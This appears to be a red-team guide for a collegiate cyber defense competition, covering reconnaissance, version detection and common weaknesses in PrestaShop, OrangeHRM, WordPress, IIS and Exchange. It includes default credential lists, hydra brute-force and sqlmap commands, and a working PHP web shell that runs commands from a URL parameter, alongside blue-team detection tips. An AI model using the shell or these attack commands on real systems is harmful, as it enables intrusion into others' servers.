# Web Application Testing Guide
## BYU CCDC Invitational 2026

> "When life gives you lemons, don't make lemonade. Make life take the lemons back!"
> - Cave Johnson

This guide covers testing methodologies for web applications commonly found in CCDC environments.

## Important Notes

1. **Authorization**: Only test systems you're authorized to test (competition scope)
2. **Documentation**: Log all testing for debrief purposes
3. **Non-Destructive**: Test without breaking production functionality
4. **Educational**: Help blue teams learn what to patch

---

## General Web Application Testing Workflow

### Phase 1: Reconnaissance

```bash
# Identify web technologies
whatweb http://TARGET_IP
curl -I http://TARGET_IP  # Check headers
nikto -h http://TARGET_IP

# Directory enumeration
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Look for version info
curl http://TARGET_IP/readme.html
curl http://TARGET_IP/CHANGELOG.txt
curl http://TARGET_IP/license.txt
```

### Phase 2: Version Identification

Look for version numbers in:
- `/admin` panels
- HTTP headers (`X-Powered-By`, `Server`)
- JavaScript files
- CSS files with version comments
- `/robots.txt`
- Error pages

---

## PrestaShop Testing (Version 1.7.x)

PrestaShop is an e-commerce platform. Older versions have known vulnerabilities.

### Version Detection

```bash
# Check for version file
curl http://TARGET/config/settings.inc.php   # May be accessible
curl http://TARGET/docs/CHANGELOG.txt
curl http://TARGET/app/AppKernel.php

# Look at source code comments
curl http://TARGET | grep -i "prestashop\|version"

# Admin panel location
curl http://TARGET/admin/     # May redirect
curl http://TARGET/adminXXXX/ # Random admin folder name
```

### Common Test Areas

1. **Admin Panel Access**
   - Default admin path often renamed but discoverable
   - Check for default credentials
   - Look for password reset functionality

2. **SQL Injection Points**
   - Search functionality
   - Product filters
   - URL parameters (id_product, id_category)
   
3. **File Upload**
   - Product image uploads
   - Module uploads (if admin access)
   - Check for upload path disclosure

4. **Known CVEs for 1.7.x**
   - Research CVE database for version-specific issues
   - CVE-2018-19126: SQL Injection in Attribute Group
   - CVE-2019-11876: Remote Code Execution

### Testing Commands (Authorized Use Only)

```bash
# Look for exposed admin
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php

# SQLMap testing (AUTHORIZED ONLY)
# sqlmap -u "http://TARGET/index.php?id_product=1" --batch --dbs

# Check for exposed files
curl http://TARGET/config/xml/
curl http://TARGET/upload/
curl http://TARGET/img/
```

---

## OrangeHRM Testing (Version 4.x)

OrangeHRM is an HR management system. Version 4.9 and earlier have known issues.

### Version Detection

```bash
# Check login page source
curl http://TARGET/symfony/web/index.php/auth/login | grep -i version

# Look for version files
curl http://TARGET/lib/confs/Conf.php
curl http://TARGET/changelog.txt
```

### Common Test Areas

1. **Authentication Bypass**
   - Default credentials: admin/admin
   - Session management issues
   - Password reset functionality

2. **SQL Injection**
   - Employee search
   - Report generation
   - URL parameters

3. **File Upload Issues**
   - Employee photo uploads
   - Document attachments
   - Check allowed file types

4. **Directory Traversal**
   - Download functionality
   - File retrieval endpoints

### Testing Approach

```bash
# Check default credentials
# admin:admin is the default

# Look for exposed endpoints
gobuster dir -u http://TARGET/symfony/web -w /usr/share/wordlists/dirb/common.txt

# Check for information disclosure
curl http://TARGET/symfony/web/index.php/api/v1/employees
```

---

## WordPress Testing

WordPress is the most common CMS. Security depends heavily on plugins.

### Version Detection

```bash
# Multiple methods to find version
curl http://TARGET/readme.html
curl http://TARGET | grep 'generator'
curl http://TARGET/wp-includes/version.php
curl http://TARGET/feed/ | grep 'generator'
```

### Enumeration

```bash
# Use WPScan (best tool)
wpscan --url http://TARGET --enumerate u,p,t

# Manual user enumeration
curl http://TARGET/?author=1
curl http://TARGET/wp-json/wp/v2/users

# Plugin enumeration
curl http://TARGET/wp-content/plugins/
gobuster dir -u http://TARGET/wp-content/plugins -w /usr/share/wordlists/dirb/common.txt
```

### Common Attack Vectors

1. **XML-RPC Abuse**
   ```bash
   # Check if enabled
   curl http://TARGET/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
   
   # Can be used for:
   # - Brute force attacks (wp.getUsersBlogs)
   # - Pingback DDoS
   ```

2. **Login Brute Force**
   ```bash
   # Using hydra (BE CAREFUL - may trigger lockout)
   # hydra -l admin -P wordlist.txt TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"
   ```

3. **Plugin Vulnerabilities**
   - Check installed plugins against exploit-db
   - Common vulnerable plugins have public exploits

### Default Credentials to Try

```
admin:admin
admin:password
admin:wordpress
administrator:admin
```

---

## IIS/Windows Web Server Testing

For Windows-based web servers (IIS).

### Fingerprinting

```bash
# Check headers
curl -I http://TARGET
curl -I http://TARGET/iisstart.htm

# Check for default pages
curl http://TARGET/iisstart.htm
curl http://TARGET/aspnet_client/
```

### Common Test Areas

1. **Short Filename Enumeration**
   - IIS may expose 8.3 filenames
   - Tools: IIS-ShortName-Scanner

2. **WebDAV Testing**
   ```bash
   davtest -url http://TARGET
   ```

3. **ASP.NET Issues**
   - Check for padding oracle
   - ViewState manipulation
   - .NET version fingerprinting

---

## Exchange Server Testing

Exchange 2016/2018 have several known vulnerabilities.

### Version Detection

```bash
# OWA version check
curl -k https://TARGET/owa/ -I

# EWS endpoint
curl -k https://TARGET/ews/exchange.asmx
```

### Common Endpoints

```
/owa/           - Outlook Web Access
/ecp/           - Exchange Control Panel
/ews/           - Exchange Web Services
/oab/           - Offline Address Book
/rpc/           - RPC over HTTP
/autodiscover/  - Autodiscover
```

### Known Vulnerability Classes

1. **ProxyShell/ProxyLogon** (CVE-2021-26855 family)
   - SSRF vulnerabilities
   - Authentication bypass
   - Check if patched

2. **NTLM Relay**
   - EWS authentication can be relayed
   - Use with responder/ntlmrelayx

---

## Web Shell Detection & Deployment (Authorized Testing)

For authorized penetration testing, web shells can demonstrate impact.

### Simple PHP Test Shell

```php
<?php
// Aperture Science Web Interface
// FOR AUTHORIZED CCDC RED TEAM USE ONLY
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
// Evidence file
file_put_contents('/tmp/.aperture_was_here', date('Y-m-d H:i:s'));
?>
```

### Detection Artifacts (For Blue Team)

Web shells typically:
- Have unusual file names (shell.php, c99.php, r57.php)
- Contain functions like: eval(), shell_exec(), system(), passthru()
- Have obfuscated code (base64_decode, gzinflate)
- Create files in unusual locations
- Generate unusual HTTP patterns

---

## Reporting Template

When you find a vulnerability, document it:

```markdown
## Finding: [Vulnerability Name]

**Target**: [IP/Hostname]
**Service**: [Web Application Name/Version]
**Severity**: [Critical/High/Medium/Low]

### Description
[What is the vulnerability]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Impact
[What could an attacker do]

### Remediation
[How to fix it]

### Evidence
[Screenshots/Logs]
```

---

## Tools Checklist

Install these tools on your red team machine:

```bash
# Web scanning
sudo apt install nikto gobuster dirb feroxbuster wpscan

# SQLi testing
sudo apt install sqlmap

# General
sudo apt install curl wget nmap netcat-traditional

# Specific
pip install dirsearch
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

---

## Ethical Reminder

```
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   "We're not just banging rocks together here. We know        ║
║    how to put a man back together."                           ║
║                                            - Cave Johnson     ║
║                                                               ║
║   Remember:                                                   ║
║   - Only test authorized systems                              ║
║   - Document everything                                       ║
║   - Don't break production functionality                      ║
║   - Help blue teams learn                                     ║
║   - Have fun with science!                                    ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
```
